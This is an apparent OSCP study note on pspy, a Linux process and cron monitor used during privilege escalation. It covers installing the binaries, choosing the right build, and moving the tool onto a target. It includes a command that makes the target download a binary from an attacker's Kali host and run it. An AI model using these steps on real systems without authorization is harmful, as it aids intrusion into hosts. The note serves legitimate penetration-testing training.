---
title: "pspy"
slug: pspy
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-25T19:48:47+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "pspy watches process creation and scheduled jobs on a Linux host without root."
---
pspy watches process creation and scheduled jobs on a Linux host without root. It reveals short-lived processes, cron jobs, and their exact command lines by scanning `/proc` and inotify events, which makes it the tool for catching a root cron job whose schedule is not readable. Used in [Cron Jobs](/collections/oscp/cron-jobs) and [Privilege Escalation](/collections/oscp/privilege-escalation-linux).

## Install

Not in the Kali repos. Download the prebuilt binaries from the GitHub release:

```bash
mkdir -p ~/tools/pspy && cd ~/tools/pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
chmod +x pspy*
```

Four self-contained Go builds ship per release, nothing to compile. Keep all four so the right one is on hand regardless of target arch and glibc age.

## Pick the Build

The `s` suffix does not mean static. Checking upstream's Makefile:

- `pspy32` / `pspy64`: built with `CGO_ENABLED=0` and `-extldflags "-static"`. A cgo-free Go binary makes syscalls directly, no libc dependency at all, so it runs regardless of the target's glibc version. Default choice.
- `pspy32s` / `pspy64s`: that build target leaves cgo enabled (no `CGO_ENABLED=0`) and pipes the result through `upx` for size. Still dynamically linked against whatever glibc was on the build image. Upstream's own Makefile comment calls this set "as small as possible, but may not work."

UPX repacking also breaks the usual way of telling the two apart: `file` on an `s` binary can report `statically linked, no section header`, because UPX rewrites the section header table while packing, not because the payload it unpacks at runtime is static. Don't trust `file` on the `s` builds. A `GLIBC_2.xx not found` error at run time from an `s` binary is expected upstream behavior, not a bad download, switch to the plain `pspy32`/`pspy64` instead of re-pulling the same asset.

Check the target's architecture from a shell on it:

```bash
uname -m
```

- `x86_64` maps to the 64-bit build (`pspy64`).
- `i686` or `i386` maps to the 32-bit build (`pspy32`).

`file /bin/ls` or `getconf LONG_BIT` answers the same question if `uname` is missing. A 64-bit kernel will usually also run a 32-bit static binary through compat support, but a 32-bit host cannot run the 64-bit build, so `pspy32` is the safer single upload when the arch cannot be checked. This same arch check applies to any static binary pushed to a target (linpeas, chisel, a ligolo agent, a static nc), not just pspy. Old targets (`law` runs glibc older than 2.32) are exactly where the `s` build fails and the plain static one is mandatory.

## Transfer and Run

pspy runs on the target. Serve the build directory from Kali and pull the matching binary:

```bash
# kali, from the pspy directory
sudo python3 -m http.server 80
# target
curl http://KALI/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy
```

Run it long enough to catch a periodic job. A minute covers a `* * * * *` cron entry:

```bash
timeout 60s /tmp/pspy
```

Run without a timeout when hunting for something that fires less often, and leave it while triggering an action to see what the host runs in response. Output shows each command as it runs with its UID, so a root job appears as `UID=0` with the full command line, pointing straight at the script to inspect for a writable target.
